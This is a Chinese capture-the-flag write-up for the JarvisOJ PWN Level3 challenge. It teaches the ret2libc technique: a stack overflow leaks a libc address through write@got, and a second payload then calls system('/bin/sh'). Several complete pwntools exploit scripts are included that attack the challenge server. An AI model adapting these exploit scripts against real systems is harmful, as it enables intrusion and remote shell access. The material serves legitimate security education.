## JarvisOJ-PWN-Level3

ret2libc攻击

前面介绍的攻击方法大量使用Shellcode，核心思想是修改EIP和注入Shellcode，在函数返回时跳到Shellcode去执行。要防止这种攻击，最有效的办法就是让攻击者注入的Shellcode无法执行，这就是数据执行保护（Data Execution Prevention， DEP）安全机制的初衷

而Dep的作用就是禁止buf中的shellcode执行，之前的实验中在同一个程序中有system函数_bin_sh，但是有的程序不会带这些东西，但在linux的环境中系统函数库glibc默认是有system，加上系统本身的_bin_sh就可以调用shell了

EIP一旦改写成system函数地址后，那执行system函数时，它需要获取参数。而根据Linux X86 32位函数调用约定，参数是压到栈上的。噢，栈空间完全由我们控制了，所以控制system的函数不是一件难事情。这种攻击方法称之为ret2libc，即return-to-libc，返回到系统库函数执行 的攻击方法


ret2libc执行system的堆栈布局
![](README/7697DC1F-431E-4EAF-BB2E-FFE581348713%204.png)

linux x86函数执行的时候，在刚刚进入system函数的时候，会默认push一个返回地址，然后才是system的参数，所以如果我们想得到一个shell的话，system地址中间需要随便加一个以作为间隔




payload的结构就是
```
A*N + system_addr + exit_addr + arg
```


根据上面的paylload结构，需要利用栈溢出，用system的真实地址（libc基址+相对地址，系统库函数的相对地址可以在libc-2.19.so中找到）覆盖当前函数栈中的返回地址（[ebp+0x4]），用“_bin_sh”的真实地址覆盖栈中的第二个参数（[ebp+0x0C]）。第一个参数（[ebp+0x8]）需要用exit函数的真实地址覆盖，作为system函数执行完后的返回地址.ret的地址是可以随便写的





## 0x01 信息检查
![](README/1A54F82A-57B0-4AB5-B2F8-8EB1D2B2D117%204.png)


![](README/E34CC7F9-2783-4D0B-9F62-FB364E86F382%204.png)
![](README/F184F5E1-5DCB-4B76-B7B1-6BEDB314AB2E%204.png)


 vulnerable_function函数存在漏洞，但是显然，程序里没有getshell的方法，然后把目光投到libc-2.19.so文件上
![](README/E5A21D0A-CCB5-4703-BBAC-2EAE42FB16F0%204.png)

system函数有
![](README/182046EF-DAB6-437B-8C53-7EA6AE578087%204.png)

_bin_sh函数有

现在就是想办法搞定system和_bin_sh的地址了

虽然函数的起始地址不同，但是函数的偏移地址是相同的
write_target_addr - write_libc = system_target_addr - system_libc

那也就是说我们只要有一个已经调用的函数的起始地址和在libc的地址就可以计算出system的地址了

获取write函数的plt和got的地址的方式一:

获取程序的plt(过程连接表)

```shell
objdump -d -j .plt level3
```

![](README/F410D590-911A-4233-8C4F-2E5FE9D4B406%204.png)

write@plt的地址是0x08048340,这和IDA中的数据是一样的

![](README/08E6B311-E384-4FB2-B146-BDE52E44CBA5%203.png)


获取程序的got(全局偏移表)
```
objdump -R level3
```

![](README/462A0988-1F88-4679-AD9F-9C06A05775CC%204.png)
write@got是0x0804a018



1. 读取Write的GOT表项在内存中的地址write@plt
2. 通过给予的glibc的信息和write的偏移量write_offset来计算libc在内存中的基地址base = write@plt - write_offset
3. 通过glibc和基地址获取system和’_bin_sh’的地址，构造ROP
![](README/4928C008-E89E-481C-B70A-3920AC6FF391%203.png)

获取write函数的plt和got的地址的方式:
从levvel3中获取write的plt地址和got地址
```
#coding=utf-8

from pwn import *

local = False


if local:
    conn = process("./level3")
    elf_libc = ELF("/lib/i386-linux-gnu/libc.so.6")

else:
    conn = remote("pwn2.jarvisoj.com", 9879)
    elf_libc = ELF("./libc-2.19.so")
    elf = ELF("./level3")


#从进程文件中获取write函数的plt地址和got地址
write_plt = elf.plt["write"]
write_got = elf.got["write"]

print(write_plt)
print(write_got)

```

![](README/058C3999-28A7-4280-8A5F-DA18FE0E59AB%203.png)

还需要获取一个函数的返回地址
![](README/93AB3FA5-DF43-4F54-93F4-F63BB5DA59F3%203.png)

vulnerable_function的返回地址是0804844B

![](README/87ADDFB4-A8FA-4D7C-BFD4-ED0CE3171297%203.png)
gdb调试的结果是一样的


前面已经用两种方式获取了write@plt和write@got的地址，然后就是想办法获取libc的基地址，构造的payload结构就是
```
payload = 一般是填充字符（栈的大小）+ ‘aaaa’（覆盖EBP）+  p32(write_plt) + p32(start)(返回地址） + p32(1)+ p32(write_got)+p32(4)
```


![](README/9702F114-D250-4A58-B55C-BB0646880E3D%203.png)
获得了write函数的基地址就是4150267872
```python
#coding=utf-8

from pwn import *

local = False


if local:
    conn = process("./level3")
    elf_libc = ELF("/lib/i386-linux-gnu/libc.so.6")

else:
    conn = remote("pwn2.jarvisoj.com", 9879)
    elf_libc = ELF("./libc-2.19.so")
    elf = ELF("./level3")


#从进程文件中获取write函数的plt地址和got地址

# write_plt = elf.plt["write"]
# write_got = elf.got["write"]
#
# print(write_plt)
# print(write_got)

write_plt = 0x08048340
write_got = 0x0804a018
addr_func = 0x0804844B

payload1 = 'a' * (0x88+0x4) + p32(write_plt) + p32(addr_func) + p32(1)+p32(write_got)+p32(4)  #溢出地址+返回地址+参数

conn.recvuntil("Input:\n")
conn.sendline(payload1)
writeaddr = u32(conn.recv(4))

print(writeaddr)

```

根据公示
write_target_addr - write_libc = system_target_addr - system_libc
system_target_add = write_target_addr - write_libc  + system_libc
要想知道system_target_add的地址还需要知道 write和system的偏移地址，还是利用万能的ida打开so文件
![](README/233FC23C-1DED-4AF7-9D01-7F000DD7908A%203.png)

system的偏移地址是0x00040310	

![](README/0D4E3213-9924-4DB6-B383-B8B28E06E7C3%203.png)

write的偏移地址就是 0x000DAFE0	

![](README/6A8B82DE-9E67-47C0-878C-FE93D2B6A125%203.png)

_bin_sh的偏移地址就是0x0016084C
![](README/0362B411-EC91-4C5D-8222-4C680F4E164B%203.png)

 最后的全量代码就是
```python
#coding=utf-8

from pwn import *

local = False


if local:
    conn = process("./level3")
    elf_libc = ELF("/lib/i386-linux-gnu/libc.so.6")

else:
    conn = remote("pwn2.jarvisoj.com", 9879)
    elf_libc = ELF("./libc-2.19.so")
    elf = ELF("./level3")


#从进程文件中获取write函数的plt地址和got地址

# write_plt = elf.plt["write"]
# write_got = elf.got["write"]
#
# print(write_plt)
# print(write_got)

write_plt = 0x08048340
write_got = 0x0804a018
addr_func = 0x0804844B

system_offset = 0x00040310
write_offset = 0x000DAFE0
sh_offset = 0x0016084C

payload1 = 'a' * (0x88+0x4) + p32(write_plt) + p32(addr_func) + p32(1)+p32(write_got)+p32(4)  #溢出地址+返回地址+参数

conn.recvuntil("Input:\n")
conn.sendline(payload1)
writeaddr = u32(conn.recv(4))

system_addr = writeaddr - write_offset + system_offset
sh_addr = writeaddr - write_offset + sh_offset

payload = "a"*(0x88+0x4)+p32(system_addr)+p32(0x4)+p32(sh_addr)
conn.send(payload)
conn.interactive()
```

![](README/D27D2B8E-B436-4DCD-BBB1-439A6141A73C%203.png)



上面的代码主要是利用ida获取so文件的地址实现的，pwntools自身也带了获取偏移地址的函数
全代码如下
```python
#!usr/bin/env python
# encoding:utf-8
from pwn import *

#io = process("./level3")
io = remote("pwn2.jarvisoj.com",9879)
elf = ELF("./level3")

#这些数据都是level3文件提供的
writeplt = elf.plt["write"]
writegot = elf.got["write"]
func = elf.symbols["vulnerable_function"]

libc = ELF("./libc-2.19.so")
writelibc = libc.symbols["write"]
syslibc = libc.symbols["system"]
binlibc = libc.search("/bin/sh").next()

payload1 = 'a' * (0x88+0x4) + p32(writeplt) + p32(func) + p32(1)+p32(writegot)+p32(4)  #溢出地址+返回地址+参数

io.recvuntil("Input:\n")
io.sendline(payload1)

writeaddr = u32(io.recv(4))
sysaddr = writeaddr - writelibc + syslibc
binaddr = writeaddr - writelibc + binlibc

payload2 = 'a' * 0x88 + 'f**k' + p32(sysaddr) + p32(func) + p32(binaddr)
io.recvuntil("Input:\n")
io.sendline(payload2)
io.interactive()
io.close()
```




*
libc中的函数相对于libc的基地址的偏移都是确定的，如果有一道题给你了libc的文件，就可以通过libc文件泄露出system函数和binsh的地址，然后再构造payload。

一般通过write()函数泄露 ，通过ELF获得write函数在got表和plt表中的地址

同时获得程序start地址 构造payload 

payload 一般是填充字符（栈的大小）+ ‘aaaa’（覆盖EBP）+  p32(write_plt) + p32(start)(返回地址） + p32(1)+ p32(write_got)+p32(4)

后面三个是write函数的参数 write(1,'write_got',4) 4代表输出4个字节，write_got则为要泄露的地址

binsh在libc中的地址可以直接搜索得到 binsh_libc = libc.search('_bin_sh').next()

其中地址计算如：

libc_base = leak_add - leak_libc(函数在libc中的偏移)

system_add  = libc_base + system_libc

binsh_add = libc_base + binsh_libc
*

[使用ret2libc攻击方法绕过数据执行保护 - CSDN博客](https://blog.csdn.net/linyt/article/details/43643499)
[Ret2Libc 攻击技术 - CSDN博客](https://blog.csdn.net/guilanl/article/details/61921481)
[linux中ret2libc入门与实践 - CSDN博客](https://blog.csdn.net/counsellor/article/details/81986052)
[一步一步学ROP之linux_x86篇-博客-云栖社区-阿里云](https://yq.aliyun.com/articles/58699)
[Jarvis OJ - XMANlevel3 - Writeup——ret2libc尝试 - 谱尼 - 博客园](https://www.cnblogs.com/ZHijack/p/7900736.html)
[通过给的libc文件泄露地址 - 简书](https://www.jianshu.com/p/4c430fe7fbb3)
[ASLR机制及绕过策略-栈相关漏洞libc基址泄露 - 简书](https://www.jianshu.com/p/728f2ef139ae)

